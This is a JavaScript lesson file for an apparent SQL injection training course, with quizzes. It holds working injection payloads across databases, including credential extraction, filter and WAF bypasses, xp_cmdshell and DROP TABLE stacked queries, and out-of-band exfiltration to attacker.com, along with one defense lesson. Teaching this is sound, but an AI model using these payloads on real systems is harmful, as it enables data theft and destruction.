const LESSONS = [
  {
    title: "SQL Injection Fundamentals",
    points: 10,
    content: `SQL (Structured Query Language) is used to communicate with databases. Websites use SQL to store and retrieve data like usernames, passwords, and articles.

A typical login query:
  SELECT * FROM users WHERE username = 'john' AND password = 'secret123';

SQL Injection (SQLi) occurs when user input is inserted into a SQL query without sanitization.

BASIC AUTH BYPASS:
  Username: admin' --      → comments out the password check
  Username: ' OR 1=1 --   → always TRUE, returns all users
  Username: admin' #       → MySQL variant

What happens with ' OR 1=1 --:
  Query: SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'x'
  1=1 is always TRUE so all rows are returned. App logs you in as first user.

SQL comment symbols:
  --   double dash (ANSI standard)
  #    hash (MySQL only)
  /**/ multi-line comment (most databases)

DETECTION PAYLOADS:
  '         → causes error if vulnerable
  ' OR 1=1-- → returns all rows
  ' OR 1=2-- → returns no rows (FALSE condition)
  The difference in responses confirms SQLi.`,
    questions: [
      { q: "What does SQL stand for?", a: "Structured Query Language" },
      { q: "What symbol breaks out of a string in SQL injection testing?", a: "'" },
      { q: "What does -- do in a SQL query?", a: "Comments out the rest of the query" },
      { q: "What payload returns all rows by creating an always-true condition?", a: "' OR 1=1 --" },
      { q: "In MySQL, what symbol is used as a comment instead of --?", a: "#" }
    ]
  },
  {
    title: "UNION-Based SQL Injection & Data Extraction",
    points: 10,
    content: `The UNION operator combines results from two or more SELECT queries. Attackers use it to extract data from other database tables.

UNION syntax:
  SELECT col1, col2 FROM table1 UNION SELECT col1, col2 FROM table2

Rules: Both SELECTs must return the SAME number of columns.

FINDING COLUMN COUNT:
Method 1 — ORDER BY (increment until error):
  ' ORDER BY 1 --   (works)
  ' ORDER BY 2 --   (works)
  ' ORDER BY 3 --   (ERROR → only 2 columns)

Method 2 — UNION SELECT NULL (increment until no error):
  ' UNION SELECT NULL --          (error)
  ' UNION SELECT NULL,NULL --     (works! → 2 columns)
  NULL works with any data type.

DATA EXTRACTION (MySQL):
  ' UNION SELECT 1,database(),3 --         → current database name
  ' UNION SELECT 1,@@version,3 --          → MySQL version
  ' UNION SELECT 1,table_name,3 FROM information_schema.tables --
  ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
  ' UNION SELECT 1,username,password FROM users --

KEY MYSQL FUNCTIONS:
  database()   → current DB name
  user()       → current DB user
  @@version    → database version
  LOAD_FILE()  → read files from filesystem`,
    questions: [
      { q: "What SQL keyword combines results from multiple SELECT queries?", a: "UNION" },
      { q: "What technique increments until an error to find column count?", a: "ORDER BY" },
      { q: "In MySQL, what function shows the current database name?", a: "database()" },
      { q: "What schema contains metadata about all tables and columns in MySQL?", a: "information_schema" },
      { q: "In MySQL, what function reads files from the filesystem?", a: "LOAD_FILE()" }
    ]
  },
  {
    title: "Error-Based SQL Injection",
    points: 10,
    content: `Error-based SQLi uses database error messages to extract information. The attacker forces the database to include data inside the error message itself.

HOW IT WORKS:
The database returns verbose errors containing parts of malformed queries. Attackers craft intentional errors that leak data.

MYSQL — EXTRACTVALUE():
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --

  EXTRACTVALUE() expects valid XPath. CONCAT(0x7e, data) creates invalid XPath.
  MySQL returns: "XPATH syntax error: '~database_name'"
  0x7e = tilde (~) character makes XPath invalid, leaking our data.

  Extract tables:
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name)
    FROM information_schema.tables WHERE table_schema=database()))) --

MYSQL — UPDATEXML():
  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)), 1) --
  Limited to 32 characters. Use SUBSTRING() for longer data:
  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(password,1,32) FROM users LIMIT 1)), 1) --

POSTGRESQL:
  ' AND 1=CAST((SELECT current_database()) AS INTEGER) --
  Error: "invalid input syntax for type integer: 'database_name'"

MSSQL:
  ' AND 1=CONVERT(INT, (SELECT @@version)) --

LIMITATIONS:
  Output truncated to 32–64 chars per error. Use SUBSTRING() to read in chunks.`,
    questions: [
      { q: "What MySQL function can leak data via XPath error messages?", a: "EXTRACTVALUE()" },
      { q: "What character (hex 0x7e) is prepended to make XPath invalid?", a: "~ (tilde)" },
      { q: "What PostgreSQL technique casts data to an incompatible type to leak it?", a: "CAST(... AS INTEGER)" },
      { q: "What is the output limit of MySQL EXTRACTVALUE()?", a: "32 characters" },
      { q: "How do you read long data in chunks with error-based SQLi?", a: "Using SUBSTRING() or SUBSTR()" }
    ]
  },
  {
    title: "Blind SQL Injection — Boolean-Based",
    points: 10,
    content: `Blind SQL Injection is used when you cannot see data output directly. Instead, you ask TRUE/FALSE questions and observe differences in the page response.

BOOLEAN-BASED BLIND:
  http://site.com/product?id=1 AND 1=1   → Page loads normally (TRUE)
  http://site.com/product?id=1 AND 1=2   → Page is different (FALSE)
  Different responses confirm boolean-based blind SQLi.

EXTRACTING DATA:
Check database name length:
  1 AND LENGTH(database())=4 --   (TRUE if DB name is 4 chars)

Extract characters one by one:
  1 AND SUBSTRING(database(),1,1)='a' --   (is 1st char 'a'?)
  Binary search reduces this to ~5 tries per character.

Check table existence:
  1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 --

ASCII-BASED (more reliable):
  1 AND ASCII(SUBSTRING(database(),1,1)) > 100 --
  1 AND ASCII(SUBSTRING(database(),1,1)) = 115 --   (115 = 's')

SUBSTRING syntax by database:
  MySQL:      SUBSTRING(str, pos, len) or MID(str, pos, len)
  PostgreSQL: SUBSTRING(str FROM pos FOR len)
  MSSQL:      SUBSTRING(str, pos, len)
  Oracle:     SUBSTR(str, pos, len)
  SQLite:     SUBSTR(str, pos, len)

Tools like sqlmap automate the entire boolean-based extraction process.`,
    questions: [
      { q: "What is blind SQL injection used for when you can't see query output?", a: "Extracting data through TRUE/FALSE questions" },
      { q: "What page behavior confirms boolean-based blind SQLi?", a: "Different responses for TRUE vs FALSE conditions" },
      { q: "What MySQL function extracts part of a string?", a: "SUBSTRING()" },
      { q: "What function converts a character to its ASCII number?", a: "ASCII()" },
      { q: "How many requests per character does binary search need vs linear search?", a: "Binary: ~5 requests vs linear: ~26 requests" }
    ]
  },
  {
    title: "Blind SQL Injection — Time-Based",
    points: 10,
    content: `Time-based SQLi is used when the page returns the same response for TRUE and FALSE. The attacker uses database delay functions — if a delay occurs, the condition is TRUE.

TIME-BASED PAYLOADS:

MySQL:
  1 AND SLEEP(5) --                     → delays 5 seconds
  1 AND IF(1=1, SLEEP(5), 0) --         → conditional delay
  1 AND BENCHMARK(10000000, MD5('a')) -- → CPU-based delay (~5s)

PostgreSQL:
  1 AND pg_sleep(5) --
  1 AND (SELECT pg_sleep(5)) --

MSSQL:
  1 WAITFOR DELAY '0:0:5' --
  1; WAITFOR DELAY '0:0:5' --

Oracle:
  1 AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5) --

EXTRACTING DATA:
Check DB name length:
  1 AND IF(LENGTH(database())=4, SLEEP(3), 0) --
  (3-second delay → DB name is 4 chars)

Extract first character:
  1 AND IF(ASCII(SUBSTRING(database(),1,1))=115, SLEEP(3), 0) --
  (3-second delay → first char ASCII 115 = 's')

BENCHMARK() in MySQL:
  BENCHMARK(count, expression) — higher count = longer delay.
  BENCHMARK(1000000, MD5('a'))   → ~0.5s
  BENCHMARK(10000000, MD5('a'))  → ~5s

CAUTION: Time-based is slow (5s per character). Use binary search + sqlmap.`,
    questions: [
      { q: "What MySQL function causes a timed delay?", a: "SLEEP()" },
      { q: "What is the PostgreSQL equivalent of SLEEP()?", a: "pg_sleep()" },
      { q: "What is the MSSQL syntax for a 5-second delay?", a: "WAITFOR DELAY '0:0:5'" },
      { q: "What MySQL function causes CPU-intensive delays as an alternative to SLEEP()?", a: "BENCHMARK()" },
      { q: "What Oracle function is used for time-based blind SQLi?", a: "DBMS_PIPE.RECEIVE_MESSAGE()" }
    ]
  },
  {
    title: "SQL Injection Filter Bypass Techniques",
    points: 10,
    content: `Developers filter dangerous SQL keywords. Attackers have many ways to bypass these.

SPACE BYPASSES (spaces filtered?):
  /**/ comments:    'OR/**/1=1/**/--
  Parentheses:      'UNION(SELECT(1),(2),(3))--
  Tabs (%09) or newlines (%0A)

KEYWORD BYPASSES:
  UNION blocked:    UnIoN, uNiOn, UN/**/ION
  SELECT blocked:   SeLeCt, SEL/**/ECT
  OR/AND blocked:   || (pipe), &&, | (bitwise), &

QUOTE BYPASSES (quotes filtered?):
  Hex encoding:   WHERE username=0x61646D696E   (0x61646D696E = 'admin')
  CHAR():         WHERE username=CHAR(97,100,109,105,110)

EQUALS BYPASS (= filtered?):
  LIKE:           ' OR 1 LIKE 1 --
  IN:             ' OR 1 IN (1) --
  BETWEEN:        ' OR 1 BETWEEN 0 AND 2 --

DOUBLE ENCODING (app decodes twice?):
  '  →  %27  →  %2527

HTTP HEADER INJECTION (SQLi in headers):
  User-Agent: ' OR 1=1 --
  X-Forwarded-For: ' OR 1=1 --
  Cookie: session=' OR 1=1 --

WAF BYPASS TECHNIQUES:
  1. Buffer overflow — very long input crashes WAF regex
  2. Parameter pollution — id=1&id=2&id=' OR 1=1--
  3. Null byte — %00 before payload
  4. Unicode normalization — full-width characters`,
    questions: [
      { q: "How can you bypass a filter that blocks spaces in MySQL?", a: "Using /**/ comments or parentheses" },
      { q: "What hex prefix represents a string in MySQL without quotes?", a: "0x" },
      { q: "What MySQL function converts ASCII codes to a string without quotes?", a: "CHAR()" },
      { q: "How do you bypass a keyword filter blocking UNION?", a: "Case variation (UnIoN) or inline comments (UN/**/ION)" },
      { q: "What is parameter pollution in WAF bypass context?", a: "Sending multiple parameters with the same name to confuse the WAF" }
    ]
  },
  {
    title: "Advanced SQLi — Second-Order, Stacked & Out-of-Band",
    points: 10,
    content: `Beyond basic SQLi, advanced techniques handle complex scenarios.

SECOND-ORDER SQL INJECTION:
Also called "stored SQLi". The payload is stored in the DB first, then executed later in a different query.

Example:
  1. Register username:  '; UPDATE users SET admin=1 WHERE username='admin' --
  2. Registration stores this safely
  3. Later, viewing profile executes stored payload in another query

Why it's dangerous: Hard to detect with scanners. Requires manual code review.

STACKED QUERIES (multiple statements with ;):
MSSQL (most flexible):
  '; EXEC xp_cmdshell 'whoami' --
  '; EXEC sp_addlogin 'hacker','pass' --

MySQL (requires multi_query API):
  '; DROP TABLE users; --
  '; UPDATE users SET password='hacked' WHERE id=1; --

PostgreSQL:
  '; COPY hacked FROM '/etc/passwd'; --

Oracle: Does NOT support stacked queries.

OUT-OF-BAND (OOB):
Send data to an external server when HTTP response is blind.

MySQL OOB:
  ' UNION SELECT 1,2,LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test')) --

MSSQL OOB (xp_dirtree):
  '; EXEC master..xp_dirtree '\\\\'+(SELECT @@version)+'.attacker.com\\test' --

Oracle OOB (UTL_HTTP):
  '; EXEC UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) --

Tools: Burp Collaborator, Interactsh, or your own VPS.`,
    questions: [
      { q: "What is second-order SQL injection?", a: "Payload stored in DB first, executed later in a different query" },
      { q: "What MSSQL function executes operating system commands?", a: "xp_cmdshell" },
      { q: "What MSSQL procedure lists directories over SMB (useful for OOB)?", a: "xp_dirtree" },
      { q: "What Oracle procedure sends HTTP requests to exfiltrate data?", a: "UTL_HTTP" },
      { q: "Why doesn't PHP mysql_query() support stacked queries?", a: "It only allows single statement execution" }
    ]
  },
  {
    title: "SQL Injection Prevention & Defense",
    points: 10,
    content: `Understanding prevention is essential for both defenders and ethical attackers.

#1 DEFENSE — PARAMETERIZED QUERIES (Prepared Statements):
User input is NEVER concatenated into the query string.

Python (sqlite3):
  cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))

PHP (PDO):
  $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
  $stmt->execute(['user' => $username, 'pass' => $password]);

Node.js (mysql2):
  connection.execute("SELECT * FROM users WHERE username = ? AND password = ?", [username, password]);

INPUT VALIDATION (secondary defense):
  Whitelist (BEST):  only allow expected characters (regex: ^[a-zA-Z0-9]+$)
  Blacklist (WORST): easily bypassed with encoding/case tricks

ESCAPING (least preferred — for legacy code only):
  MySQL:      mysql_real_escape_string()   (NOT addslashes())
  PostgreSQL: pg_escape_string()

LEAST PRIVILEGE:
  Web app DB account should only have SELECT + INSERT on needed tables.
  No DROP, CREATE, ALTER, FILE privileges.
  No access to xp_cmdshell (MSSQL).

WAF (Web Application Firewall):
  ModSecurity, Cloudflare WAF, AWS WAF — useful but bypassable.
  Defense-in-depth, not sole protection.

COMPLETE PREVENTION CHECKLIST:
  ✔ Parameterized queries for ALL DB operations
  ✔ Least privilege database accounts
  ✔ Whitelist input validation
  ✔ Disable error messages in production
  ✔ WAF as additional layer
  ✔ Regular security testing (sqlmap + manual)
  ✔ Log and monitor database errors`,
    questions: [
      { q: "What is the #1 defense against SQL injection?", a: "Parameterized queries / prepared statements" },
      { q: "In Python sqlite3, what placeholder is used in parameterized queries?", a: "?" },
      { q: "What is the least preferred defense involving escaping input?", a: "Escaping (e.g., mysql_real_escape_string)" },
      { q: "Why should a web app DB account not have FILE privilege?", a: "Prevents LOAD_FILE and INTO OUTFILE attacks" },
      { q: "What approach is better: whitelist or blacklist input validation?", a: "Whitelist validation" }
    ]
  },
  {
    title: "SQLi Payload Reference",
    points: 10,
    content: `A complete reference of SQL injection payloads by technique and database.

AUTH BYPASS:
  admin' --       admin' #       admin'/*
  ' OR 1=1--      ' OR 1=1#      ') OR '1'='1'--

UNION-BASED (MySQL):
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT 1,database(),@@version--
  ' UNION SELECT 1,table_name,3 FROM information_schema.tables--
  ' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--

UNION-BASED (PostgreSQL):
  ' UNION SELECT 1,current_database(),version()--

UNION-BASED (MSSQL):
  ' UNION SELECT 1,db_name(),@@version--

UNION-BASED (SQLite):
  ' UNION SELECT 1,sqlite_version(),3--
  ' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--

ERROR-BASED (MySQL):
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1) --

BOOLEAN BLIND:
  ' AND 1=1--         (TRUE)
  ' AND 1=2--         (FALSE)
  ' AND LENGTH(database())=N--

TIME-BASED:
  MySQL:       ' AND SLEEP(5)--
  PostgreSQL:  ' AND pg_sleep(5)--
  MSSQL:       ' WAITFOR DELAY '0:0:5'--

FILTER BYPASS:
  Space:    'OR/**/1=1--
  Hex:      0x61646D696E  ('admin')
  Keyword:  UnIoN  SEL/**/ECT`,
    questions: [
      { q: "What MySQL variable shows the server version in a UNION query?", a: "@@version" },
      { q: "What MySQL function concatenates multiple rows into one string?", a: "GROUP_CONCAT()" },
      { q: "What Oracle function is used for time-based blind SQLi?", a: "DBMS_PIPE.RECEIVE_MESSAGE()" },
      { q: "What MSSQL stacked query command executes system commands?", a: "EXEC xp_cmdshell 'command'" },
      { q: "What hex encoding represents 'admin' in MySQL?", a: "0x61646D696E" }
    ]
  }
];
